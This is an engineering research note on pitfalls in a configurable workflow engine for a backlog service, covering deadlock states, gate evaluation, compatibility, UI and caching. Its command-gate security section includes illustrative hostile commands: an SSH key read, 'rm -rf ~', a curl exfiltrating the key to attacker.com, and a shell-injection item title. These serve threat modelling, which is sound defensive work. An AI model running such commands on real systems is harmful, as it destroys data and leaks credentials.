# Research: Pitfalls — backlog-workflow-engine

**Date**: 2026-05-19
**Phase**: 2 — Research
**Scope**: Known failure modes for a configurable workflow engine layered on top of the existing backlog service

---

## 1. Workflow Graph Pitfalls

### 1.1 Deadlock states

A user can create a state (e.g. `awaiting-design`) with no outgoing transitions. Any item that lands there is permanently stuck — there is no `CanTransitionBacklog`-equivalent to check because the server validates transitions against the `WorkflowConfig` at runtime, not at config-save time.

**Mitigation required at `SaveWorkflowConfig` time:**
- Run a reachability check from every non-terminal state: does a path exist to every terminal state? At minimum, every non-terminal state must have at least one outgoing transition.
- Define "terminal state" explicitly in the schema (e.g. `terminal: true` flag). The current `archived` is implicitly terminal; the custom engine must make this explicit.
- The check is a simple DFS/BFS over the `transitions[]` graph. Reject the save with a detailed error listing which states are unreachable.

### 1.2 Orphan items

When a user deletes a state that existing items occupy, those items have a `status` value that no longer appears in `WorkflowConfig.states[]`. The existing DB schema stores `status` as a plain `string` column — this is actually helpful here because no FK constraint breaks.

**The concrete failure modes:**
- `ListBacklogItems` renders items whose `status` has no matching label, color, or column in the board UI.
- `TransitionBacklogItemStatus` is called with `from = "awaiting-design"` but the config no longer has transitions out of that state → the server rejects the transition as invalid, leaving the item permanently stuck.
- `ReconcileStuckItems` has no knowledge of custom states and hardcodes `BacklogStatusInProgress`; it will miss items stuck in custom in-progress states (see §6.1).

**Required S3 validation on state deletion:**
- Count items currently in the state being deleted.
- Reject deletion if any items exist in that state, OR force the caller to supply a `migration_target_status` that is valid in the current config.
- The UI must surface the count ("3 items are in this state — where should they go?").

### 1.3 Infinite loops in the graph

The `transitions[]` graph is directed but not necessarily acyclic. A user could define: `A → B → A`. This is not inherently catastrophic — the current state machine already has backward transitions (e.g. `in_progress → ready`). The risk is automation: if a future event-driven rules engine auto-advances items, a cycle becomes a runaway loop.

For S2–S5 scope, cycles should be **permitted but documented** as unsupported for automation gates. The `SaveWorkflowConfig` validation should detect cycles and warn (not block) unless automation triggers are also being configured.

**Detection**: Tarjan's SCC algorithm or simple DFS cycle detection. The graph is small (≤20 nodes typical), so complexity is irrelevant.

### 1.4 Multiple terminal states

The design allows custom states. A user might create `done-design` and `done-dev` as separate terminal states. Gates on transitions to terminal states (e.g. the current `review → done` guard that requires a PASS verdict) must be attached to transitions, not states. The current `TransitionGuard` in `session/backlog.go` is hardcoded to the `review → done` transition by name — it must be replaced by the WorkflowConfig gate evaluation.

---

## 2. Gate Evaluation Pitfalls

### 2.1 Command gate security

Running arbitrary shell commands on the server is the highest-risk feature in this spec. The attack surface in a single-process Go app with no container boundary:

- **Arbitrary file read/write**: `cat ~/.ssh/id_rsa > /tmp/out` or `rm -rf ~`
- **Network exfiltration**: `curl https://attacker.com?k=$(cat ~/.ssh/id_rsa)`
- **Process escalation**: spawning long-running background processes that survive the gate timeout
- **Injection via item fields**: if the gate command template interpolates item title or description into the shell command (e.g. `make test -- "{{item.title}}"`), an item titled `"; curl attacker.com` becomes an injection vector

**What's feasible in a single-process Go app (no Docker daemon required):**

| Approach | Feasibility | Notes |
|---|---|---|
| `os/exec` with restricted `PATH` | Easy | Reduces binary availability but doesn't prevent dangerous builtins |
| `syscall.Setrlimit` (CPU, memory, file descriptors) | Medium | macOS has partial support; limits resource exhaustion |
| Working-directory scoping: set CWD to the item's `repo_path` only | Easy | Prevents traversal if the command doesn't use absolute paths |
| Allowlist of permitted commands | Easy | Solves 80% of the real use case (`make test`, `npm run lint`) — consider making the first implementation allowlist-only |
| Process group kill on timeout | Required | `cmd.Process.Kill()` only kills the parent; use `syscall.SysProcAttr{Setpgid: true}` + `syscall.Kill(-pgid, syscall.SIGKILL)` to kill the whole tree |

**Recommendation for v1:** Implement command gate as an allowlist stored in `WorkflowConfig`. Users register named shell commands at config time (e.g. `{id: "run-tests", command: "make test"}`); gate configs reference command IDs, not raw strings. This eliminates injection and dramatically reduces the attack surface.

The existing `CommandExecutor` in `session/command_executor.go` is a PTY-based executor for interactive AI sessions — it is **not** appropriate for gate commands, which need synchronous exit-code capture in an isolated process. Use `os/exec.CommandContext` with a process-group kill pattern.

### 2.2 Custom condition expressions

**`cel-go` is already in `go.sum`** (pulled transitively) — use it rather than adding a new dependency. CEL is safe: it has no I/O, no side effects, deterministic evaluation, and a type checker.

CEL-specific pitfalls:
- CEL programs must be compiled and type-checked before being stored; reject expressions that don't compile at config-save time
- The evaluation context (what variables are available) must be versioned in the schema so old expressions don't break when new fields are added to `BacklogItem`
- String-length and iteration over large collections are unbounded by default; set `cel.OptimizeRegex` and a `cel.ProgramOption` with `cel.EvalOptions(cel.OptTrackState)` to bound execution

Do **not** use `expr` (antonmedv) — it evaluates arbitrary Go expressions and can panic on type errors. CEL is the correct choice here and is already available.

### 2.3 Gate bypass: server-side enforcement

The current `TransitionBacklogItemStatus` RPC in `backlog_service.go` already calls `CanTransitionBacklog` and `TransitionGuard` server-side — the client cannot bypass them. The workflow engine must keep gate evaluation server-side, inside `TransitionBacklogItemStatus`, not client-side.

**Specific risk**: The React client currently tracks which transitions are "allowed" for rendering button states, but the source of truth for enforcement must remain the server. If the client evaluates gates locally (e.g. to disable the "Move to done" button when CI is red), it must treat server rejection as authoritative and re-fetch item state on a 4xx response.

The `expected_status` / `expected_updated_at` optimistic-locking fields in `TransitionBacklogItemStatusRequest` are already present in the proto — use them for concurrent-transition conflict detection (see §4.4).

### 2.4 Command gate timeout and process leak

The existing `CommandExecutor` has a 5-minute default timeout (`DefaultExecutionOptions`), but it only cancels the Go context — it does not kill child processes. A gate command that forks a daemon (`npm run dev &`) will survive context cancellation.

**Required pattern for gate command execution:**
```go
cmd := exec.CommandContext(ctx, "sh", "-c", commandStr)
cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
// On timeout or cancel:
syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
```

Additionally, gate commands must have a hard cap (e.g. 30 seconds) much shorter than the 5-minute default, since they block item transitions synchronously from the user's perspective.

---

## 3. Backward Compatibility Pitfalls

### 3.1 Changing `status` from proto enum to string

**Current state**: `BacklogItem.status` is already a `string` field in both the proto (`backlog.proto` line 6: `string status = 6`) and the ent schema (`field.String("status").Default("idea")`). This is the project's biggest structural advantage — the proto and DB are already string-typed.

**What still breaks when adding new status values:**

- **TypeScript `BacklogItemStatus` union**: `useBacklogService.ts` defines a closed union type `"idea" | "ready" | "in_progress" | "review" | "done" | "archived"`. Any status value not in this union will be cast via `as BacklogItemStatus` (line 219) and render as `undefined` in switch statements. All `if (item.status === "idea")` guards in `BacklogItemDetail.tsx`, `BacklogBoard.tsx`, `BacklogItemPanel.tsx` will silently fall through for unknown statuses. This is approximately 15–20 hardcoded string comparisons across the frontend that must be audited.

- **`BacklogBoard.tsx` column list**: `COLUMNS` is a hardcoded array of `{ status, label }` tuples. Custom states won't appear as columns until the board is driven by `WorkflowConfig.states[]`.

- **`ReconcileStuckItems`**: hardcodes `backlogitem.Status(string(BacklogStatusInProgress))` — will not reconcile items stuck in custom in-progress states.

- **`SuggestNextItem`** in `backlog_service.go` queries for items in `BacklogStatusReady` specifically — will not suggest items in custom pre-implementation states.

- **Go `switch` statements**: The `validTransitions` map and `TransitionGuard` in `backlog.go` will be fully replaced by `WorkflowConfig` evaluation, but callers that reference `BacklogStatusIdea`, `BacklogStatusReady`, etc. by constant (7 files, ~57 occurrences) will need a migration strategy. Recommendation: keep the constants for the default workflow, generate them from `WorkflowConfig` at startup.

### 3.2 The `archived` terminal state

`archived` is currently hardcoded as a terminal state with only one allowed outgoing transition (`archived → idea` in `validTransitions`). It also sets `archived_at` timestamp on the ent entity.

If a user deletes `archived` from their custom workflow:
- Existing archived items have a non-nil `archived_at` column but a `status` that no longer exists in the graph.
- The `ArchiveBacklogItem` RPC sets `archived_at` explicitly — it bypasses `TransitionBacklogItemStatus`. This means archiving can happen out-of-band from the workflow engine.

**Recommendation**: Treat `archived` as a protected system state that cannot be deleted, similar to how `idea` must remain as the default entry state. Enforce this in `SaveWorkflowConfig` validation.

### 3.3 JSON serialization of unknown status values in older clients

The TypeScript client casts `p.status || "idea"` to `BacklogItemStatus`. If a new status value arrives from the server that isn't in the union, TypeScript's type system doesn't protect at runtime — the value passes through as a string, but conditional rendering keyed on known status values simply won't fire.

**Mitigation**: Add an `unknown` fallback branch to the `BacklogItemStatus` union, or make the union `string` for display-only components and use a type guard for action-gating. The board column renderer must handle unrecognized statuses gracefully (render in an "Other" column or preserve the raw string as the label).

---

## 4. Workflow Builder UI Pitfalls

### 4.1 ReactFlow bundle size

ReactFlow v11 is ~180KB gzipped; v12 adds another ~20KB for the new architecture. This would be the largest single dependency added to the `web-app` bundle. The backlog page at `/backlog` already loads the full backlog list — adding ReactFlow to the same bundle would slow the initial page load.

**Mitigation options (in order of preference):**
1. Lazy-load the workflow builder as a dynamically imported route (`/settings/workflow`) — never loaded by users who only use the backlog page. This is strongly recommended.
2. Use a lightweight SVG-based custom renderer for the v1 builder: nodes are `<rect>` elements, edges are `<path>` elements with arrow markers. The graph is small (≤10 states typical) and static layout (no physics). Total implementation: ~200 lines of SVG + React. No external dependency.
3. If ReactFlow is chosen, import only `@reactflow/core` (skip minimap, controls, background) — saves ~40KB.

### 4.2 Unsaved changes while items are transitioning

The workflow builder shows the current `WorkflowConfig`. If a user is editing the graph (unsaved) while an item simultaneously transitions via the lifecycle listener (e.g. triage completes, item moves `idea → refining`), there is a TOCTOU window: the user saves their edited config, but their local copy was based on stale state.

The `WorkflowConfig` is workspace-level, so this is a write-after-read race. The existing optimistic locking pattern (tracking `updated_at` on items) should be applied to `WorkflowConfig` as well — include a `config_version` or `updated_at` in the save request and reject stale saves with a 409.

### 4.3 Concurrent workflow edits

In small teams (S — "Secondary" user type), two users could open the settings page simultaneously and both save changes. Last-write-wins will silently discard one user's changes.

The optimistic locking approach above handles this. The UI must handle the 409 by re-fetching the latest config, showing a diff, and asking the user to re-apply their changes.

---

## 5. AI Refinement Loop Pitfalls

### 5.1 Indefinite `refining` state

If the triage AI keeps generating clarifying questions and the user keeps answering them, the item stays in `refining` indefinitely. The requirements say "Triage transitions item to `idea` (with populated AC) when satisfied" — but there is no mechanism to force satisfaction.

**Required guardrails:**
- Maximum number of triage loop iterations (e.g. 5 question rounds). After the limit, triage must either auto-accept the current state or transition to `idea` and let the user decide.
- Maximum wall-clock time in `refining` (e.g. 24 hours). After this, the triage session is considered abandoned.

### 5.2 User abandonment: item stuck in `refining`

If the user never answers a clarifying question, the item stays in `refining` forever. The `ReconcileStuckItems` mechanism only handles `in_progress` items — it has no awareness of `refining`.

**Required**: A separate timeout-based reconciler that finds items in `refining` with no triage activity in the last N hours and auto-transitions them back to `idea`. This should be driven by the same periodic ticker that calls `ReconcileStuck`.

### 5.3 Triage failure mid-`refining`

The `BacklogLifecycleListener.onSessionExited` currently only handles `in_progress → review` transitions. If a triage session exits with an error while the item is in `refining`, nothing transitions the item back.

**Required**: The lifecycle listener must handle `triage` session exits in `refining` state explicitly — transition back to `idea` on error, or stay in `refining` with an error flag if the session exited abnormally (the `SessionRole` is already `"triage"`; the role guard at line 106 of `backlog_lifecycle.go` currently returns early for non-work sessions).

### 5.4 Re-entrant triage

If a user manually triggers triage on an item that is already in `refining`, two triage sessions will be active simultaneously. The `TriggerTriage` RPC has no guard against this. Add a guard: `if item.Status == "refining" { return error("triage already in progress") }`.

---

## 6. Performance Pitfalls

### 6.1 WorkflowConfig on every read

`GetBacklogItem` and `ListBacklogItems` will need to load `WorkflowConfig` to determine which transitions are valid for each item (for rendering action buttons client-side). `ListBacklogItems` with 100+ items makes this particularly expensive.

**Current situation**: There is no `WorkflowConfig` entity yet. When it is added, it must not be loaded per-item.

**Required caching strategy:**
- Cache `WorkflowConfig` in memory at the service layer with a short TTL (e.g. 5 seconds) or invalidate on write. A `sync.RWMutex` + `time.Time` last-fetched pattern is sufficient — this is the existing double-checked locking pattern documented in `CLAUDE.md`.
- Do not load `WorkflowConfig` in `GetBacklogItem` or `ListBacklogItems` at all. Instead, return the item's raw `status` string and have the client look up valid transitions by calling a separate `GetWorkflowConfig` RPC once (or cache it in the React query layer).

### 6.2 SQLite JSON column size

`WorkflowConfig` will store `states[]`, `transitions[]`, and `gates[]` as JSON in a single column (or normalized into separate tables). With complex gate configurations, this JSON could grow to tens of kilobytes.

SQLite stores all columns of a row inline up to the page size (4KB default). Larger values spill to overflow pages. For a single workspace-level config row, this is acceptable — but if `WorkflowConfig` is ever moved to per-project scope, the read amplification would increase proportionally.

**Recommendation**: Store `states`, `transitions`, and `gates` as separate JSON columns rather than one nested blob. This allows targeted updates (updating just a gate without rewriting the full config) and makes the column sizes predictable.

### 6.3 Gate evaluation latency on `TransitionBacklogItemStatus`

Gate evaluation is synchronous in the RPC handler. Command gates can take 30+ seconds (running `make test`). This makes `TransitionBacklogItemStatus` a long-polling endpoint.

**Required**: Command gates must run asynchronously:
1. User calls `TransitionBacklogItemStatus` — server validates structural rules, starts gate evaluation in a goroutine, returns a `202 Accepted` with a `gate_run_id`.
2. Client polls `GetGateRunStatus(gate_run_id)` or subscribes via the existing event bus.
3. On gate pass, the item transitions; on gate fail, the item stays put with a visible reason.

This is a significant architectural implication for S5 that is not reflected in the current scope. Field gates and triage gates can remain synchronous (they are instant DB checks). Approval gates are already inherently async (waiting for human input). Only command and CI gates require the async pattern.

---

## Cross-Cutting Concerns

### Z.1 Default workflow must be bootstrapped, not migrated

The default `WorkflowConfig` must be seeded into the DB on first startup (not via a schema migration). Implement as a startup check: if no `WorkflowConfig` exists for the workspace, insert the default. This is the same pattern used by `ItemSource` bootstrapping. Do not use ent auto-migration for this — auto-migration only creates tables, not rows.

### Z.2 The `validTransitions` map and `TransitionGuard` are both load-bearing

`session/backlog.go` defines both the transition graph (`validTransitions`) and business-rule guards (`TransitionGuard`). When `WorkflowConfig` is introduced, both must be replaced by dynamic evaluation. The interim period — where `WorkflowConfig` exists but is optional — is dangerous: callers may check `CanTransitionBacklog` (the static map) instead of the config-driven version. Introduce a single `WorkflowEngine` interface with a `CanTransition(from, to string) bool` method and swap the implementation at startup, rather than calling `CanTransitionBacklog` in multiple places.

### Z.3 DB index on `status` column

`session/ent/schema/backlog_item.go` defines composite indexes on `("status", "priority")` and `("status", "updated_at")`. These will perform well for custom string statuses since SQLite indexes string columns efficiently. No migration concern here — the indexes are already string-based. The only risk is cardinality: if a user creates 15 custom states, the indexes remain useful.
